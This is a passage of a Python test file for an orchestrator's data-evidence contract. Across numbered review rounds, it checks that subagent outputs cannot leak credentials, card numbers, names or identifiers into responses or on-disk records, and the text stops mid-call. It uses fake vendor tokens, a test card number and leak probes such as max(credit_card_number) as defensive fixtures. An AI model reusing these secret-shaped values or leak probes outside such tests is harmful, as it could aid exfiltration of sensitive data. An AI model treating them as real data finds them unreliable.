    assert _aggregate_shape_problems({"number": 1, "dimension": "user_id=847291"})
    assert _read_request_shape_problems(
        {"operation": "read", "metric": "events", "aggregation": "count", "grouping": ["user_id"]}
    )
    assert _read_request_shape_problems(
        {
            "operation": "read",
            "metric": "events",
            "aggregation": "count",
            "filters": ["customer_id=847291"],
        }
    )
    # Category scopes and category groupings stay valid.
    assert _aggregate_shape_problems({"number": 78, "dimension": "plan=growth"}) == []
    assert (
        _read_request_shape_problems(
            {
                "operation": "read",
                "metric": "events.checkout",
                "aggregation": "count",
                "filters": ["plan=growth", "created_at>2026-01-01"],
                "grouping": ["month", "region"],
            }
        )
        == []
    )

    # B3 — a vendor token does not stop being one because a word precedes it.
    for value in (
        "warehouse_xoxb-123456789-abcdefghij",
        "tool_ghp_abcd1234efgh5678",
        "reader_AKIAIOSFODNN7EXAMPLE",
    ):
        assert _identifier_looks_secret(value), value
    for value in ("clickhouse_query", "token_usage_v2", "metabase.card.query"):
        assert not _identifier_looks_secret(value), value

    # B4 — a measurement is finite; 1e400 is not.
    # Round-52: a cardinality is a whole, non-negative number of rows, and an
    # infinity fails that before finiteness is reached.
    assert _aggregate_shape_problems({"number": float("1e400")})

    # B5 — the advertised policy is persisted and its caps are enforced.
    registry = FanoutRegistry(tmp_path)
    policy = {
        "read_only": True,
        "aggregate_only": True,
        "evidence_policy": {"max_evidence_items": 5, "max_evidence_chars": 400},
    }
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-policy",
        lanes=[
            {
                "lane_id": "data_context",
                "purpose": "Data evidence.",
                "capability": "call_mcp",
                "required": True,
                "data_policy": policy,
                "answer_contract": {
                    "contract_id": "data_evidence_answer.v1",
                    "response_model_schema": {"type": "object"},
                },
            }
        ],
    )
    assert fanout_id is not None
    record = registry.load(fanout_id)
    assert record is not None
    assert record.synthesizer_input["lane_data_policies"]["data_context"] == policy

    oversized = _minimal_data_output()
    oversized["evidence"] = [_typed_evidence(source=f"warehouse_{index}") for index in range(4)]
    out = submit_fanout_results(
        registry,
        session_id="sess-policy",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": oversized}],
        fanout_id=fanout_id,
    )
    assert out["status"] == "partial"
    assert any(
        "max_evidence_chars" in error
        for violation in out["contract_violations"]
        for error in violation["errors"]
    )


def test_round44_ownership_and_evidence_invariants(tmp_path: Any) -> None:
    """Round-44's blockers, each closed by an existence claim."""
    import json

    from jsonschema import Draft202012Validator

    from ouroboros.contracts.data_evidence import (
        _data_evidence_boundary_violations,
        _data_evidence_fallback_schema,
    )
    from ouroboros.orchestrator.capabilities.interview_schemas import _data_context_lane_policy

    policy = _data_context_lane_policy()

    # B1 — a mismatch reply must not name what it expected, or the check
    # becomes an oracle: session first, correlation key second, completion third.
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry,
        session_id="sess-secret",
        lanes=[
            {
                "lane_id": "code_context",
                "purpose": "p",
                "capability": "inspect_code",
                "required": True,
            }
        ],
    )
    assert fanout_id is not None
    probe = submit_fanout_results(
        registry,
        session_id="guess",
        correlation_key="guess",
        results=[],
        fanout_id=fanout_id,
    )
    assert probe["status"] == "correlation_mismatch"
    assert "expected_session_id" not in probe
    assert "expected_correlation_key" not in probe
    assert "sess-secret" not in json.dumps(probe)
    assert probe["mismatched_field"] == "session_id"

    # B2 — a record table has no shape to take, and a unit is a declared
    # measurement unit rather than any lowercase word.
    laid_out = _minimal_data_output("Alice Smith premium 12 seats / Bob Jones free 8 seats")
    assert any(
        "record-layout separators" in error
        for error in _data_evidence_boundary_violations(laid_out, policy)
    )
    worn_unit = _minimal_data_output()
    worn_unit["evidence"] = [_typed_evidence(value={"number": 1012345678, "unit": "phone"})]
    assert any(
        "outside the aggregate shape" in error
        for error in _data_evidence_boundary_violations(worn_unit, policy)
    )

    # B3 — the degraded contract keeps the structure; it is not a weaker form.
    fallback = _data_evidence_fallback_schema()
    Draft202012Validator.check_schema(fallback)
    assert list(
        Draft202012Validator(fallback).iter_errors(
            {"requires_user_confirmation": True, "raw_rows": [{"name": "Alice", "acct": "847291"}]}
        )
    )
    assert (
        list(
            Draft202012Validator(fallback).iter_errors(
                {
                    "lane_id": "data_context",
                    "data_needed": False,
                    "finding": "No data evidence is needed.",
                    "confidence": "no_evidence",
                    "evidence": [],
                    "proposed_queries": [],
                    "requires_user_confirmation": True,
                }
            )
        )
        == []
    )

    # Follow-up — the value no longer repeats the request's aggregation, so
    # that contradiction is unrepresentable; what stays bindable is the scope.
    mismatched = _minimal_data_output()
    mismatched["evidence"] = [_typed_evidence(value={"number": 42, "dimension": "plan=growth"})]
    assert any(
        "did not apply" in error for error in _data_evidence_boundary_violations(mismatched, policy)
    )
    assert _data_evidence_boundary_violations(_minimal_data_output(), policy) == []


def test_round45_field_grammars_close_their_classes() -> None:
    """Round-45's blockers, each closed by removing a field's freedom."""
    from ouroboros.contracts.data_evidence import (
        _data_evidence_boundary_violations,
        _read_request_shape_problems,
    )
    from ouroboros.orchestrator.capabilities.interview_schemas import (
        _data_context_answer_contract,
        _data_context_lane_policy,
        data_evidence_structural_schema,
    )

    policy = _data_context_lane_policy()

    # B2 — identity words are matched per token, and a metric is a
    # measurement name rather than somewhere a credential can sit.
    assert _read_request_shape_problems(
        {"operation": "read", "metric": "m", "aggregation": "count", "grouping": ["email_address"]}
    )
    assert _read_request_shape_problems(
        {"operation": "read", "metric": "password_swordfish", "aggregation": "count"}
    )
    assert (
        _read_request_shape_problems(
            {
                "operation": "read",
                "metric": "active_users",
                "aggregation": "count",
                "grouping": ["plan_tier", "created_month"],
            }
        )
        == []
    )

    # B3 — the value no longer repeats the request's aggregation, so the
    # contradiction has no field; the scope stays bound to what was grouped.
    unfiltered = _minimal_data_output()
    unfiltered["evidence"] = [_typed_evidence(value={"number": 42, "dimension": "plan=growth"})]
    assert any(
        "did not apply" in error for error in _data_evidence_boundary_violations(unfiltered, policy)
    )
    # Round-46: executed evidence is one number, so its request narrows with
    # filters rather than grouping.
    grouped = _minimal_data_output()
    grouped["evidence"] = [
        _typed_evidence(
            request={
                "operation": "read",
                "metric": "active_users",
                "aggregation": "count",
                "grouping": ["plan"],
            }
        )
    ]
    assert any(
        "may not group" in error for error in _data_evidence_boundary_violations(grouped, policy)
    )
    scoped = _minimal_data_output()
    scoped["evidence"] = [
        _typed_evidence(
            value={"number": 42, "dimension": "plan=growth"},
            request={
                "operation": "read",
                "metric": "active_users",
                "aggregation": "count",
                "filters": ["plan=growth"],
            },
        )
    ]
    assert _data_evidence_boundary_violations(scoped, policy) == []

    # B4 — the degraded form IS the published schema: every required field and
    # every conditional invariant survives an unenforceable declared contract.
    assert (
        data_evidence_structural_schema()
        == (_data_context_answer_contract()["response_model_schema"])
    )


def test_round46_prose_is_not_durable_and_scope_binds_to_filters(tmp_path: Any) -> None:
    """Round-46: the PII guarantee becomes true by removing what it covered.

    ``pii_scrub_required`` cannot be enforced over a name and a street address
    — no pattern recognizes them — so the advisory prose the guarantee covered
    no longer enters durable state. The host receives it in the response it
    submitted; the record keeps the typed facts.
    """
    import json as json_module
    import os
    import stat

    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    lanes = [dict(lane) for lane in advisory["lanes"]]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-prose", lanes=lanes
    )
    assert fanout_id is not None

    data_output = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Alice Smith at 12 Main Street is the top account.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(
                request={
                    "operation": "read",
                    "metric": "active_users",
                    "aggregation": "count",
                    "filters": ["plan=growth"],
                },
                value={"number": 42, "dimension": "plan=growth"},
            )
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Bob Jones at 34 Oak Ave was excluded."],
    }
    results = [
        {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    results.append({"key": "data_context", "content": data_output})
    out = submit_fanout_results(
        registry,
        session_id="sess-prose",
        correlation_key="context.lane_id",
        results=results,
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    # The host still receives the advisory prose it submitted.
    assert "Alice Smith" in json_module.dumps(out)

    record_path = tmp_path / f"{fanout_id}.json"
    on_disk = record_path.read_text()
    assert "Alice Smith" not in on_disk
    assert "Oak Ave" not in on_disk
    # Round-55: not even the count is retained — a cardinality can be a card
    # number. What the record keeps is the server-derived shape.
    assert '"content_retained": false' in on_disk
    assert '"evidence_count": 1' in on_disk
    # Replay serves the durable form, so the prose cannot re-enter later.
    replay = submit_fanout_results(
        registry,
        session_id="sess-prose",
        correlation_key="context.lane_id",
        results=[],
        fanout_id=fanout_id,
    )
    assert replay["status"] == "already_complete"
    assert "Alice Smith" not in json_module.dumps(replay)

    # Owner-only permissions on the record and its directory.
    assert stat.S_IMODE(os.stat(record_path).st_mode) == 0o600
    assert stat.S_IMODE(os.stat(tmp_path).st_mode) == 0o700


def test_round46_filter_operators_are_all_parsed() -> None:
    """Identity scope is parsed on every operator the grammar accepts."""
    from ouroboros.contracts.data_evidence import _read_request_shape_problems

    for scoped in ("tenant_id=847291", "tenant_id>847291", "org_uuid<ffffffff", "profile_key!=abc"):
        assert _read_request_shape_problems(
            {"operation": "read", "metric": "m", "aggregation": "count", "filters": [scoped]}
        ), scoped
    for category in ("plan=growth", "created_at>2026-01-01", "region!=kr"):
        assert (
            _read_request_shape_problems(
                {"operation": "read", "metric": "m", "aggregation": "count", "filters": [category]}
            )
            == []
        ), category


def test_round48_request_fields_and_replay_consent(tmp_path: Any) -> None:
    """Round-48: sensitive request fields, identity metrics, and honest replay."""
    import json as json_module

    from ouroboros.contracts.data_evidence import _read_request_shape_problems
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    # B1 — every parsed request field gets the credential classification.
    for request in (
        {"operation": "read", "metric": "u", "aggregation": "count", "grouping": ["password"]},
        {
            "operation": "read",
            "metric": "u",
            "aggregation": "count",
            "filters": ["access_token!=huntertwo"],
        },
    ):
        assert any("credential" in problem for problem in _read_request_shape_problems(request)), (
            request
        )

    # B3 — an identity metric may be counted, never valued.
    for metric in ("ssn", "phone_number", "email_address"):
        assert _read_request_shape_problems(
            {"operation": "read", "metric": metric, "aggregation": "max"}, executed=True
        ), metric
        assert (
            _read_request_shape_problems(
                {"operation": "read", "metric": metric, "aggregation": "distinct_count"}
            )
            == []
        ), metric

    # B2 — a replayed data completion says it cannot be confirmed.
    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    lanes = [dict(lane) for lane in advisory["lanes"]]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-consent", lanes=lanes
    )
    assert fanout_id is not None
    results = [
        {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    results.append(
        {
            "key": "data_context",
            "content": {
                "lane_id": "data_context",
                "data_needed": True,
                "finding": "Growth leads at 78%.",
                "confidence": "reported_by_tool",
                "evidence": [
                    _typed_evidence(
                        request={
                            "operation": "read",
                            "metric": "active_users",
                            "aggregation": "count",
                            "filters": ["plan=growth"],
                        },
                        value={"number": 42, "dimension": "plan=growth"},
                    )
                ],
                "proposed_queries": [],
                "requires_user_confirmation": True,
                "caveats": ["Point-in-time."],
            },
        }
    )
    assert (
        submit_fanout_results(
            registry,
            session_id="sess-consent",
            correlation_key="context.lane_id",
            results=results,
            fanout_id=fanout_id,
        )["status"]
        == "complete"
    )
    replay = submit_fanout_results(
        registry,
        session_id="sess-consent",
        correlation_key="context.lane_id",
        results=[],
        fanout_id=fanout_id,
    )
    assert replay["status"] == "already_complete"
    assert replay["consent_status"] == "not_confirmable_prose_not_retained"
    assert "re-run" in replay["consent_note"]
    assert "Growth leads" not in json_module.dumps(replay)


def test_round49_retained_state_is_server_owned(tmp_path: Any) -> None:
    """Round-49: lifecycle states are separate schemas, and one vocabulary."""
    import json as json_module

    from jsonschema import Draft202012Validator

    from ouroboros.contracts.data_evidence import (
        _aggregation_kinds,
        _data_context_answer_contract,
        _read_request_fields,
        _read_request_shape_problems,
        data_evidence_retained_schema,
        redact_prose_for_persistence,
    )
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    published = _data_context_answer_contract()["response_model_schema"]
    submitted = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Growth leads at 78%.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(
                request={
                    "operation": "read",
                    "metric": "active_users",
                    "aggregation": "count",
                    "filters": ["plan=growth"],
                },
                value={"number": 42, "dimension": "plan=growth"},
            )
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }
    # B1 — a fresh caller cannot declare itself retained to skip the prose.
    assert list(Draft202012Validator(published).iter_errors(submitted)) == []
    self_declared = {k: v for k, v in submitted.items() if k not in ("finding", "caveats")}
    self_declared["prose_retained"] = False
    assert list(Draft202012Validator(published).iter_errors(self_declared))
    # The server's own durable form validates under the retained schema.
    assert (
        list(
            Draft202012Validator(data_evidence_retained_schema()).iter_errors(
                redact_prose_for_persistence(submitted)
            )
        )
        == []
    )

    # Warning 1 — the semantic vocabulary is the schema's vocabulary.
    assert _aggregation_kinds() == frozenset(published["$defs"]["aggregation_kind"]["enum"])
    assert _read_request_fields() == frozenset(published["$defs"]["read_request"]["properties"])
    assert (
        _read_request_shape_problems(
            {
                "operation": "read",
                "metric": "latency",
                "aggregation": "percentile",
                "percentile": 95,
            }
        )
        == []
    )

    # B3 — a category value is a lowercase label; a proper noun is not one.
    def _with_filter(value: str) -> dict[str, Any]:
        return {
            "lane_id": "data_context",
            "data_needed": True,
            "finding": "Needs a lookup.",
            "confidence": "inferred",
            "evidence": [],
            "proposed_queries": [
                {
                    "tool_name": "warehouse",
                    "request": {
                        "operation": "read",
                        "metric": "u",
                        "aggregation": "count",
                        "filters": [value],
                    },
                    "expected_decision": "why",
                    "source_class": "metered",
                }
            ],
            "requires_user_confirmation": True,
        }

    for value in ("segment=AliceSmith", "user=Bob"):
        assert list(Draft202012Validator(published).iter_errors(_with_filter(value))), value
    for value in ("plan=growth", "region=kr", "cohort=2026-01"):
        assert list(Draft202012Validator(published).iter_errors(_with_filter(value))) == [], value

    # B2 — a completion assembled from an earlier accumulation says it is not
    # confirmable, exactly as a replay does.
    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    lanes = [dict(lane) for lane in advisory["lanes"]]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-acc", lanes=lanes
    )
    assert fanout_id is not None
    first = submit_fanout_results(
        registry,
        session_id="sess-acc",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": submitted}],
        fanout_id=fanout_id,
        finalize=False,
    )
    assert first["status"] == "accumulated"
    closing = submit_fanout_results(
        registry,
        session_id="sess-acc",
        correlation_key="context.lane_id",
        results=[
            {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
            for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
        ],
        fanout_id=fanout_id,
    )
    # Round-56: the server kept only a summary of that earlier submission, so
    # the lane is honestly MISSING rather than completed around a stub. The
    # host resends it in the final call, which is the normal single-call path.
    assert closing["status"] == "complete"
    assert "data_context" in closing["missing_optional_keys"]
    assert "consent_status" not in closing
    assert "Growth leads" not in json_module.dumps(closing)


def test_round50_lifecycle_is_provenance_and_scopes_are_keys(tmp_path: Any) -> None:
    """Round-50: state comes from where a value came from, not from the value."""
    import json as json_module

    from ouroboros.contracts.data_evidence import (
        _read_request_shape_problems,
        redact_prose_for_persistence,
    )
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    lanes = [dict(lane) for lane in advisory["lanes"]]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-50", lanes=lanes
    )
    assert fanout_id is not None

    # B1 — a FRESH result claiming to be retained is still a submission.
    self_declared = {
        "lane_id": "data_context",
        "data_needed": True,
        "confidence": "reported_by_tool",
        "evidence": [_typed_evidence()],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "prose_retained": False,
    }
    out = submit_fanout_results(
        registry,
        session_id="sess-50",
        correlation_key="context.lane_id",
        results=[{"key": "data_context", "content": self_declared}],
        fanout_id=fanout_id,
        finalize=False,
    )
    assert [item["lane_id"] for item in out["contract_violations"]] == ["data_context"]

    # B2 — a category value never reaches durable state; its key does.
    submitted = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Growth leads at 78%.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(
                request={
                    "operation": "read",
                    "metric": "active_users",
                    "aggregation": "count",
                    "filters": ["street=123_main_st"],
                },
                value={"number": 42, "dimension": "street=123_main_st"},
            )
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }
    retained = redact_prose_for_persistence(submitted)
    # Round-55: scope KEYS are child-authored too, so the record keeps the
    # shape and none of the substance.
    assert "evidence" not in retained
    assert retained["evidence_count"] == 1
    assert "123_main_st" not in json_module.dumps(retained)
    assert "street" not in json_module.dumps(retained)

    # Warning — the percentile discriminator is two-way.
    assert _read_request_shape_problems(
        {"operation": "read", "metric": "m", "aggregation": "count", "percentile": 95}
    )
    assert (
        _read_request_shape_problems(
            {"operation": "read", "metric": "m", "aggregation": "percentile", "percentile": 95}
        )
        == []
    )

    # Warning — the consent marker belongs to the data contract's own results.
    generic = FanoutRegistry(tmp_path / "generic")
    generic_id = register_question_advisory_fanout_from_lanes(
        generic,
        session_id="sess-generic",
        lanes=[
            {
                "lane_id": "code_context",
                "purpose": "p",
                "capability": "inspect_code",
                "required": True,
            }
        ],
    )
    assert generic_id is not None
    generic_out = submit_fanout_results(
        generic,
        session_id="sess-generic",
        correlation_key="context.lane_id",
        results=[
            {"key": "code_context", "content": {"lane_id": "code_context", "prose_retained": False}}
        ],
        fanout_id=generic_id,
    )
    assert generic_out["status"] == "complete"
    assert "consent_status" not in generic_out


def test_round51_value_returning_aggregations_cannot_carry_a_number(tmp_path: Any) -> None:
    """A number reaches durable state only through an aggregation that reduces.

    Round-51 probe: ``max(credit_card_number)`` returns the card number, and no
    vocabulary of column names can decide which columns identify. What IS
    decidable is whether an aggregation returns one of its inputs, so executed
    evidence is restricted to the reducing kinds. Proposals may still request
    the others — they carry no value.
    """
    import json as json_module

    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    lanes = [dict(lane) for lane in advisory["lanes"]]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-51", lanes=lanes
    )
    assert fanout_id is not None

    card_number = 4111111111111111
    leaking = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Highest stored value.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(
                request={
                    "operation": "read",
                    "metric": "credit_card_number",
                    "aggregation": "max",
                },
                value={"number": card_number},
            )
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }
    results = [
        {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    results.append({"key": "data_context", "content": leaking})
    out = submit_fanout_results(
        registry,
        session_id="sess-51",
        correlation_key="context.lane_id",
        results=results,
        fanout_id=fanout_id,
    )
    assert [item["lane_id"] for item in out["contract_violations"]] == ["data_context"]
    # The rejected number appears in neither the response nor the record.
    assert str(card_number) not in json_module.dumps(out)
    assert str(card_number) not in (tmp_path / f"{fanout_id}.json").read_text()

    # The reducing kinds still work end to end.
    accepted = {
        **leaking,
        "evidence": [
            _typed_evidence(
                request={
                    "operation": "read",
                    "metric": "active_users",
                    "aggregation": "distinct_count",
                    "filters": ["plan=growth"],
                },
                value={"number": 4200, "dimension": "plan=growth"},
            )
        ],
    }
    clean_registry = FanoutRegistry(tmp_path / "clean")
    clean_id = register_question_advisory_fanout_from_lanes(
        clean_registry, session_id="sess-51b", lanes=lanes
    )
    assert clean_id is not None
    clean_results = [
        {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    clean_results.append({"key": "data_context", "content": accepted})
    clean = submit_fanout_results(
        clean_registry,
        session_id="sess-51b",
        correlation_key="context.lane_id",
        results=clean_results,
        fanout_id=clean_id,
    )
    assert clean["status"] == "complete"
    assert clean["contract_violations"] == []

    # A percentile stays requestable as a PROPOSAL, which carries no number.
    proposing = {
        **accepted,
        "confidence": "inferred",
        "evidence": [],
        "caveats": ["Point-in-time."],
        "proposed_queries": [
            {
                "tool_name": "warehouse",
                "request": {
                    "operation": "read",
                    "metric": "latency",
                    "aggregation": "percentile",
                    "percentile": 95,
                },
                "expected_decision": "Whether the p95 breaches the target.",
                "source_class": "metered",
            }
        ],
    }
    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations
    from ouroboros.orchestrator.capabilities.interview_schemas import _data_context_lane_policy

    assert _data_evidence_boundary_violations(proposing, _data_context_lane_policy()) == []


def test_round52_cardinalities_only_and_transportable_content(tmp_path: Any) -> None:
    """Evidence carries counts, and untransportable content stops at the door."""
    import json as json_module

    from jsonschema import Draft202012Validator

    from ouroboros.contracts.data_evidence import (
        _aggregate_shape_problems,
        _cardinality_aggregations,
        _data_context_answer_contract,
    )
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    schema = _data_context_answer_contract()["response_model_schema"]

    def _evidence_with(aggregation: str, number: Any = 42) -> dict[str, Any]:
        return {
            "lane_id": "data_context",
            "data_needed": True,
            "finding": "Highest stored value.",
            "confidence": "reported_by_tool",
            "evidence": [
                _typed_evidence(
                    request={
                        "operation": "read",
                        "metric": "credit_card_number",
                        "aggregation": aggregation,
                    },
                    value={"number": number},
                )
            ],
            "proposed_queries": [],
            "requires_user_confirmation": True,
            "caveats": ["Point-in-time."],
        }

    # B1 — sum/avg can reproduce an input on a singleton cohort, so evidence
    # reports only cardinalities.
    assert _cardinality_aggregations() == frozenset({"count", "distinct_count"})
    for aggregation in ("sum", "avg", "max", "min", "median"):
        assert list(Draft202012Validator(schema).iter_errors(_evidence_with(aggregation))), (
            aggregation
        )
    for aggregation in ("count", "distinct_count"):
        assert list(Draft202012Validator(schema).iter_errors(_evidence_with(aggregation))) == [], (
            aggregation
        )

    # Warning — a cardinality is a whole, non-negative number of rows.
    assert _aggregate_shape_problems({"number": -1.5})
    assert _aggregate_shape_problems({"number": -3})
    assert _aggregate_shape_problems({"number": 4200}) == []

    # B2 — content that cannot cross the transport is malformed at the door,
    # so no outcome is built around it and no response fails to serialize.
    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-52", lanes=[dict(lane) for lane in advisory["lanes"]]
    )
    assert fanout_id is not None
    unpaired = "counted " + chr(0xD800) + " rows"
    out = submit_fanout_results(
        registry,
        session_id="sess-52",
        correlation_key="context.lane_id",
        results=[
            {"key": "data_context", "content": {"lane_id": "data_context", "finding": unpaired}}
        ],
        fanout_id=fanout_id,
    )
    assert out["malformed_keys"] == ["data_context"]
    # The response itself must survive the transport it describes.
    json_module.dumps(out, ensure_ascii=False).encode("utf-8")


def test_round53_identifier_payloads_and_countable_units(tmp_path: Any) -> None:
    """A tool name is not a payload, and a count is counted in countable things."""
    import json as json_module

    from ouroboros.contracts.data_evidence import _data_evidence_boundary_violations
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata
    from ouroboros.orchestrator.capabilities.interview_schemas import _data_context_lane_policy

    policy = _data_context_lane_policy()

    def _output(source: str = "clickhouse_query", unit: str | None = None) -> dict[str, Any]:
        return {
            "lane_id": "data_context",
            "data_needed": True,
            "finding": "Growth leads.",
            "confidence": "reported_by_tool",
            "evidence": [
                _typed_evidence(
                    source=source,
                    request={
                        "operation": "read",
                        "metric": "active_users",
                        "aggregation": "count",
                    },
                    value={"number": 42, **({"unit": unit} if unit else {})},
                )
            ],
            "proposed_queries": [],
            "requires_user_confirmation": True,
            "caveats": ["Point-in-time."],
        }

    # B1 — an identifier-length digit run is a payload wearing the field.
    assert any(
        "identifier-length digit run" in error
        for error in _data_evidence_boundary_violations(
            _output(source="metrics_4111111111111111"), policy
        )
    )
    # Tool names legitimately carry short numbers.
    for source in ("metabase.card.4471", "s3_logs_20260725", "clickhouse_query"):
        assert _data_evidence_boundary_violations(_output(source=source), policy) == [], source

    # Round-54: the unit field is gone entirely, so a cardinality can no
    # longer be reported in a duration.
    assert any(
        "outside the aggregate shape" in error
        for error in _data_evidence_boundary_violations(_output(unit="ms"), policy)
    )

    # End to end: the rejected payload reaches neither response nor record.
    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-53", lanes=[dict(lane) for lane in advisory["lanes"]]
    )
    assert fanout_id is not None
    results = [
        {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    results.append({"key": "data_context", "content": _output(source="metrics_4111111111111111")})
    out = submit_fanout_results(
        registry,
        session_id="sess-53",
        correlation_key="context.lane_id",
        results=results,
        fanout_id=fanout_id,
    )
    assert [item["lane_id"] for item in out["contract_violations"]] == ["data_context"]
    assert "4111111111111111" not in json_module.dumps(out)
    assert "4111111111111111" not in (tmp_path / f"{fanout_id}.json").read_text()


def test_round54_durable_record_holds_only_provable_parts(tmp_path: Any) -> None:
    """Child-authored identifiers are delivered, not retained; categories work."""
    import json as json_module

    from ouroboros.contracts.data_evidence import (
        _read_request_shape_problems,
        redact_prose_for_persistence,
    )
    from ouroboros.mcp.tools.subagent import _reportable_unexpected_key
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    submitted = {
        "lane_id": "data_context",
        "data_needed": True,
        "finding": "Growth leads.",
        "confidence": "reported_by_tool",
        "evidence": [
            _typed_evidence(
                source="alice.smith",
                request={
                    "operation": "read",
                    "metric": "alice_smith",
                    "aggregation": "count",
                    "filters": ["plan=growth"],
                },
                value={"number": 42, "dimension": "plan=growth"},
            )
        ],
        "proposed_queries": [],
        "requires_user_confirmation": True,
        "caveats": ["Point-in-time."],
    }
    # B1 — nothing a child wrote as an identifier survives into the record.
    retained = redact_prose_for_persistence(submitted)
    assert "alice" not in json_module.dumps(retained)
    # Round-55: no child-authored field survives, including the scope keys and
    # the number; what stays is the server-derived shape.
    assert "evidence" not in retained
    assert retained["evidence_count"] == 1
    assert retained["content_retained"] is False

    # B3 — a lane-id-shaped key that is credential- or payload-shaped is not
    # echoed back into a response.
    for key in ("ghp_abcdefghijklmnopqrstuvwxyz1234567890", "metrics_4111111111111111"):
        assert _reportable_unexpected_key(key).startswith("<redacted-key"), key
    assert _reportable_unexpected_key("code_context") == "code_context"

    # Warning — legitimate category scopes are attainable again.
    for scope in ("year=2026", "customer_segment=enterprise", "account_tier=growth"):
        assert (
            _read_request_shape_problems(
                {"operation": "read", "metric": "u", "aggregation": "count", "filters": [scope]}
            )
            == []
        ), scope
    for scope in ("user_id=847291", "email_address=x", "tenant_id>847291"):
        assert _read_request_shape_problems(
            {"operation": "read", "metric": "u", "aggregation": "count", "filters": [scope]}
        ), scope

    # End to end: the submitted identifiers reach the host, not the disk.
    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    registry = FanoutRegistry(tmp_path)
    fanout_id = register_question_advisory_fanout_from_lanes(
        registry, session_id="sess-54", lanes=[dict(lane) for lane in advisory["lanes"]]
    )
    assert fanout_id is not None
    results = [
        {"key": lane, "content": {"lane_id": lane, "finding": "ok"}}
        for lane in ("code_context", "web_context", "ambiguity_contrarian", "answer_simplifier")
    ]
    results.append({"key": "data_context", "content": submitted})
    out = submit_fanout_results(
        registry,
        session_id="sess-54",
        correlation_key="context.lane_id",
        results=results,
        fanout_id=fanout_id,
    )
    assert out["status"] == "complete"
    assert out["contract_violations"] == []
    assert "alice" in json_module.dumps(out)
    assert "alice" not in (tmp_path / f"{fanout_id}.json").read_text()


def test_rendered_instructions_agree_with_the_shipped_schema() -> None:
    """A child following the prompt must produce output re-entry accepts.

    Round-55: after the unit left the aggregate, the prompt still asked for
    "a number with a unit", so a compliant child was rejected — the worst
    failure shape, since nothing the child does is wrong. This test binds the
    rendered instruction to the schema so the two cannot drift again.
    """
    from ouroboros.contracts.data_evidence import (
        _data_context_answer_contract,
        _data_context_lane_policy,
    )
    from ouroboros.orchestrator.capabilities import ouroboros_tool_capability_metadata

    advisory = ouroboros_tool_capability_metadata("ouroboros_interview")["orchestration"][
        "question_advisory_fanout"
    ]
    payloads = build_interview_question_advisory_subagents(
        {
